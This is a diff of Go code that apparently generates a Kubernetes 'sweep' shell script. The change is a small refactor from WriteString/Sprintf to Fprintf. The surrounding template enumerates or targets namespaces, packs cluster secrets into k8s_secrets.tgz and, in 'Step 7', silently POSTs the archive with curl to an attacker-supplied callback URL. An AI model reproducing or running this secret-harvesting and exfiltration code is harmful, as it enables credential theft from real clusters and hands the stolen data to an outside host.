@@ -98,11 +98,11 @@ _K8S_SWEEP() {
 				quoted = append(quoted, ns)
 			}
 		}
-		b.WriteString(fmt.Sprintf(`  # Step 3: Target specific namespaces
+		fmt.Fprintf(&b,`  # Step 3: Target specific namespaces
   NAMESPACES="%s"
   echo "[*] Targeting namespaces: $NAMESPACES"
 
-`, strings.Join(quoted, " ")))
+`, strings.Join(quoted, " "))
 	} else {
 		b.WriteString(`  # Step 3: Discover all accessible namespaces
   echo "[*] Enumerating namespaces via /api/v1/namespaces..."
@@ -219,7 +219,7 @@ _K8S_SWEEP() {
 `)
 
 	if callbackURL != "" {
-		b.WriteString(fmt.Sprintf(`  # Step 7: Exfiltrate via HTTP callback
+		fmt.Fprintf(&b,`  # Step 7: Exfiltrate via HTTP callback
   echo "[*] Exfiltrating to callback..."
   curl -sS -X POST \
     -H "Content-Type: application/octet-stream" \
@@ -227,7 +227,7 @@ _K8S_SWEEP() {
     --data-binary @"$_sdir/k8s_secrets.tgz" \
     "%s" >/dev/null 2>&1 || true
 
-`, callbackURL))
+`, callbackURL)
 	} else {
 		b.WriteString(`  # Step 7: Store as artifact (no callback URL specified)
   if [ -f "$_sdir/k8s_secrets.tgz" ]; then
